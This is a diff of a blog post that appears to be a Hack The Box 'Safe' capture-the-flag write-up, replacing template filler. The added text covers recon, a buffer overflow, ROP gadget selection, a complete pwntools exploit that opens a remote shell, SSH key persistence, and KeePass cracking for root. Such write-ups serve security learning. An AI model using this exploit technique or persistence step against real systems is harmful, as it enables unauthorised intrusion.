@@ -113,149 +113,91 @@ By now, time to start my reconaissance part.
 
 First, let's check if any of the running services can be exploited remotely.
 
-![](https://guides.github.com/activities/hello-world/branching.png)
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/searchsploit.PNG)
 
 Nothing interesting so far. Better to see what is running under port 80.
-![](https://guides.github.com/activities/hello-world/branching.png)
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/port80.PNG)
 
-Hurray, a boring **Apache** default page. Fuzzing does not give us any interesing information either.
-![](https://guides.github.com/activities/hello-world/branching.png)
+Hurray, a boring **Apache** default page... Fuzzing does not give us any interesing information either.
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/fuzz.PNG)
 
 However, reviewing the page source code gives us finally some valuable info! It seems that an app called 'myapp' (duh) is running under port 1337. 
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/fuzz.PNG)
+
 Also, we can download it by browsing into http://10.10.10.147/myapp. `curl -v -XGET http://10.10.10.147/myapp -o myapp` 
 ![](https://guides.github.com/activities/hello-world/branching.png)
 
 It smells like a challenge similar to the BOF from the OSCP :). We need to confirm it sending a large message to the program. 
-![](https://guides.github.com/activities/hello-world/branching.png)
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/overflow.PNG)
+
 Yep, we go the buffer overflow. Let's run `checksec` to see if it has any security measures enabled.
-![](https://guides.github.com/activities/hello-world/branching.png)
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/checksec.PNG)
 
 Yikes, **NX enabled** (non-executable stack). We can not simply put our shellcode in the stack to jump and execute it. 
-![](https://guides.github.com/activities/hello-world/branching.png)
-After opening the binary with **Ghidra** and looking into the decompiled code, we can ensure that there exists the buffer overflow as only 112 characters are reserved for the string. Also, the function system is called, which can allow us to execute remote code via ROP. We need a way to put `/bin/sh` onto the _rdi_ register and then call the local function `system()`. 
 
-Note that _rdi_ acts as the first argument for the function that will be called later. In x86 binaries, arguments were passed pushing registers into the stack.  
+After opening the binary with **Ghidra** and looking into the decompiled code, we can ensure that there exists the buffer overflow as only **112 characters** are reserved for the string. Also, the function system is called, which can allow us to execute remote code via ROP. Obviously, the argument passed to this function is not a shell. It is actually the _uptime_ binary:
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/uptime_rdi.PNG)
+![](uptime exec)
 
-Text can be **bold**, _italic_, ~~strikethrough~~ or `keyword`.
+## [](#header-2)Exploitation
 
-[Link to another page](another-page).
+It is time to use some binary exploitation skills. 
+We need a way to put `/bin/sh` onto the _rdi_ register and then call the local function `system()`. 
+> Note: _rdi_ register always acts as the first argument for the function that will be called. In x86 binaries, arguments were passed pushing registers into the stack.  
 
-There should be whitespace between paragraphs.
+Using `objdump` we find a `system()` call in address 0x401040.
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/system_addr.PNG)
 
-There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.
+Now I will use `gef` to inspect the source code main and test functions.
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/info_functions.PNG)
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/disas main tests.PNG)
 
+Apparently, when the `test()` function ends, jumps to the memory address stored in the r13 register, so we need to put there the `system()` call we addressed before. In order to do this we need to look for a ROP gadget where we can store the system call. I will simplify this process using **ropper**:
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/ropper.PNG)
 
-This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.
+Looks like `0x0000000000401206` would work for us.
 
+We are almost finishing! We need to overwrite the stack base pointer with our shell, which will be done with the _pattern create_ and _pattern offset_ utilities of `gef`: 
 
-> This is a blockquote following a header.
->
-> When something is important enough, you do it even if the odds are not in your favor.
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/pattern_create.PNG)
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/pattern_offset.PNG)
+So the string `oaaaaaaa` will be in our case a `/bin/sh\x00`. Time to develope our own exploit with the help of **pwntools**.
 
-### [](#header-3)Header 3
+```python
+from pwn import *
 
+p = remote('10.10.10.147', 1337) 
+buffer = "A"*112 + "/bin/sh\x00"   # rbp = /bin/sh\x00
+buffer += p64(0x401206)            # ROP gadget addr
+buffer += p64(0x401040)            # r13 = system() call addr 
+buffer += p64(0x000000)            # r14 = blank
+buffer += p64(0x000000)            # r15 = blank
+buffer += p64(0x401152)            # init() addr
+
+print("Safe(10.10.10.147) HTB machine remote exploit") 
+p.sendline(buffer)
+p.interactive()
 ```
+It worked!!! :D
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/remoteshell.PNG)
 
-```
+As the SSH service is enabled, I can add my public key to the authorized_keys file on the target:
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/ssh-keygen.PNG)
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/sshshell.PNG)
 
+## [](#header-2)Privilege Escalation
 
-```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
-```
+Root is easier than user, you'll see. First, Copy every file from the user folder.
 
-```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
-```
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/scp.PNG)
 
-#### [](#header-4)Header 4
+Now let's crack the keepass database. We have a list of images which can be a hint that the database key could be one of them. However, in addition to the file, it is protected with a password, so I will use a small wordlist for each image  used to decrypt de database.
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/crack_keepass.PNG)
 
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
+It seems that the IMG_0547.JPG, along with the password 'bullshit', is our entrance to root :).
+IMG_0547.JPG
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/root_pwd.PNG)
 
-##### [](#header-5)Header 5
-
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
-
-###### [](#header-6)Header 6
-
-| head1        | head two          | three |
-|:-------------|:------------------|:------|
-| ok           | good swedish fish | nice  |
-| out of stock | good and plenty   | nice  |
-| ok           | good `oreos`      | hmm   |
-| ok           | good `zoute` drop | yumm  |
-
-### There's a horizontal rule below this.
-
-* * *
-
-### Here is an unordered list:
-
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
-
-### And an ordered list:
-
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
-
-### And a nested list:
-
-- level 1 item
-  - level 2 item
-  - level 2 item
-    - level 3 item
-    - level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-
-### Small image
-
-![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)
-
-### Large image
-
-![](https://guides.github.com/activities/hello-world/branching.png)
-
-
-### Definition lists can be used with HTML syntax.
-
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
-
-```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
-```
-
-```
-The final element.
-```
+Performing a su root with the password retrieved leads us to our beloved root shell. Reading the flags from here is trivial.
+![](https://kikoas1995.github.io/assets/2020-03-19-Hackthebox_Safe/flags.PNG)
 
